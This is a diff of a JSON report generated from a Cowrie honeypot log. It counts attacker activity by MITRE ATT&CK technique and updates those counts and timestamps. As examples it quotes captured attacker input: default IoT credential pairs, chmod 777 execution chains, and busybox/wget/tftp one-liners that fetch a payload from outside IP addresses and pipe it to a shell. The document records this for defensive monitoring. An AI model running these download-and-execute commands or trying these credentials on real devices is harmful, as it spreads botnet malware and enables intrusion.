@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-19 14:03:45",
+  "generated": "2026-08-19 15:03:45",
   "totals": {
-    "commands": 4732,
-    "login_failed": 3669,
-    "login_success": 1513,
-    "sessions": 3900
+    "commands": 4773,
+    "login_failed": 3955,
+    "login_success": 1521,
+    "sessions": 4220
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3669,
+      "count": 3955,
       "examples": [
         "root / vizxv",
         "root / 19801021",
@@ -21,14 +21,14 @@
         "root / 19820308"
       ],
       "first": "2026-08-19T00:00:00.138204Z",
-      "last": "2026-08-19T14:03:41.292658Z",
-      "unique_ips": 65
+      "last": "2026-08-19T15:03:31.007623Z",
+      "unique_ips": 74
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1513,
+      "count": 1521,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "hikvision / hikvision",
@@ -37,14 +37,14 @@
         "telnetadmin / telnetadmin"
       ],
       "first": "2026-08-19T00:00:00.538972Z",
-      "last": "2026-08-19T13:32:07.351036Z",
-      "unique_ips": 44
+      "last": "2026-08-19T15:03:37.266337Z",
+      "unique_ips": 52
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 114,
+      "count": 129,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-19T00:55:54.512846Z",
-      "last": "2026-08-19T12:56:54.430352Z",
-      "unique_ips": 11
+      "last": "2026-08-19T14:13:26.823029Z",
+      "unique_ips": 12
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 85,
+      "count": 89,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,8 +69,8 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T12:56:54.430352Z",
-      "unique_ips": 12
+      "last": "2026-08-19T14:13:26.823029Z",
+      "unique_ips": 13
     },
     {
       "id": "T1082",
@@ -91,14 +91,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 7,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T12:56:17.671427Z",
-      "unique_ips": 6
+      "last": "2026-08-19T14:12:50.583357Z",
+      "unique_ips": 7
     },
     {
       "id": "T1057",
@@ -180,51 +180,51 @@
   "unmapped": [
     [
       "shell",
-      1481
+      1483
     ],
     [
       "sh",
-      1481
+      1483
     ],
     [
       "system",
-      1464
+      1466
     ],
     [
       "/bin/busybox",
-      36
+      43
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      18
     ],
     [
       "/bin/busybox LZRD",
       16
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      16
-    ],
-    [
       "enable",
-      12
+      14
     ],
     [
       "cd /proc && cat self/cmdline",
-      12
+      14
     ],
     [
       "linuxshell",
-      11
+      13
     ],
     [
       "ping ;sh",
-      10
+      12
     ],
     [
       "enablelinuxshell",
-      9
+      11
     ],
     [
       "busybox",
-      4
+      5
     ],
     [
       "RPMA",
